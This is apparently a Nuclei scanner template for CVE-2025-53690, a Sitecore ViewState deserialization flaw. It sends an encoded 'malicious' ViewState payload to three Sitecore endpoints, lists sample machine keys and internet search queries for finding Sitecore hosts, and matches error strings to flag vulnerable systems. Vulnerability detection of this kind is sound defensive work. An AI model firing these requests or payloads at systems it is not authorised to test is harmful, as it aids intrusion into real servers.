id: CVE-2025-53690

info:
  name: Sitecore Experience Manager & Platform - ViewState Deserialization Code Injection
  author: RaghavArora14
  severity: critical
  description: |
    Sitecore Experience Manager (XM) and Experience Platform (XP) through 9.0 contain an insecure deserialization vulnerability caused by deserialization of untrusted data in ViewState, allowing attackers to inject code remotely through crafted ViewState payloads when sample machine keys are used.
  impact: |
    Successful exploitation allows unauthenticated remote code execution on vulnerable Sitecore instances using sample machine keys from deployment guides.
  remediation: |
    Replace all static machineKey values in web.config with unique keys, encrypt machineKey elements, restrict access to web.config, and implement regular rotation of machine keys.
  reference:
    - https://cloud.google.com/blog/topics/threat-intelligence/viewstate-deserialization-zero-day-vulnerability
    - https://github.com/B1ack4sh/Blackash-CVE-2025-53690
    - https://github.com/rxerium/CVE-2025-53690
    - https://nvd.nist.gov/vuln/detail/CVE-2025-53690
    - https://www.bleepingcomputer.com/news/security/hackers-exploited-sitecore-zero-day-flaw-to-deploy-backdoors/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-53690
    cwe-id: CWE-502
    epss-score: 0.95000
    epss-percentile: 0.99900
    cpe: cpe:2.3:a:sitecore:experience_manager:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: sitecore
    product: experience_manager
    shodan-query:
      - title:"Sitecore"
      - http.title:"sitecore"
    fofa-query: title="sitecore"
    google-query: intitle:"sitecore"
  tags: cve,cve2025,sitecore,rce,viewstate,deserialization,kev

variables:
  marker: "{{rand_base(8)}}"
  # Sample machine keys from Sitecore deployment guides - commonly reused in production
  validation_key: "CB2F20173A9240636DE8A2A9C18A33A45B5E4E6A4BE19D4CDD636070926A34C3C8CBE53B8A2A91F0C0C91C4C97C506E81A22851B8DDCDFC6C1A1C8A6C6CF9BEE"
  decryption_key: "8C8B14B1F8D9A7F4B3C2E1D6F8A5C9B3E2D7F1A8C5B9E4D1F7A2C8B5E9D3F6A1"
  # Malicious ViewState payload for deserialization detection
  payload_template: "/wFqhVSOrgNQagAAAAAAAAAZAQAAAAkAAAAMAgAAAFdTeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYQ0KQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAAvAEAACN+AACAAgAA4AEAACNTdHJpbmdzAAAAAGAEAACIAAAAI1VTAAAAAAAAEAAAACNHVUQAAAAACAAAABANAG9iAAAAAAAAAIAJTABDbGFzcwAAAAAAAAAKAAEAAAAAAP////8BAAAAAAAAEFAAAAAABEFCAAFAAAAAAEAAAA8AAP////8BAAAAAAAAAAAAAAAA"

http:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/sitecore/shell/default.aspx"
      - "{{BaseURL}}/sitecore/login"
    
    matchers:
      - type: word
        part: body
        words:
          - "Sitecore"
        condition: and
        internal: true

    extractors:
      - type: regex
        part: body
        group: 1
        name: viewstate
        internal: true
        regex:
          - '__VIEWSTATE[^>]*value="([^"]*)"'

      - type: regex
        part: body
        group: 1
        name: eventvalidation
        internal: true
        regex:
          - '__EVENTVALIDATION[^>]*value="([^"]*)"'

  - raw:
      - |
        POST /sitecore/shell/default.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        __VIEWSTATE={{url_encode(payload_template)}}&__EVENTVALIDATION={{eventvalidation}}&__EVENTTARGET=&__EVENTARGUMENT=

      - |
        POST /sitecore/admin/showversion.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        __VIEWSTATE={{url_encode(payload_template)}}&__EVENTVALIDATION={{eventvalidation}}&__EVENTTARGET=&__EVENTARGUMENT=

      - |
        POST /sitecore/login/default.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        __VIEWSTATE={{url_encode(payload_template)}}&__EVENTVALIDATION={{eventvalidation}}&__EVENTTARGET=&__EVENTARGUMENT=

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 500

      - type: word
        part: body
        words:
          - "System.Web.UI.ViewStateException"
          - "MAC validation failed" 
          - "Invalid viewstate"
          - "ViewState validation"
          - "deserialization"
          - "{{marker}}"
        condition: or

      - type: word
        part: header
        words:
          - "text/html"

# Enhanced detection with flow
flow: http(1) && http(2)

# digest: 4a0a00473045022100d95a2ecbe16bd1419946df6de0076c0aca2e559c41281a5105941056cc49bb6c022066165c7ccc109875f19ceaebd954198bdcc1911cdf519b1f9b8cd10129bea3d3:922c64590222798bb761d5b6d8e72950
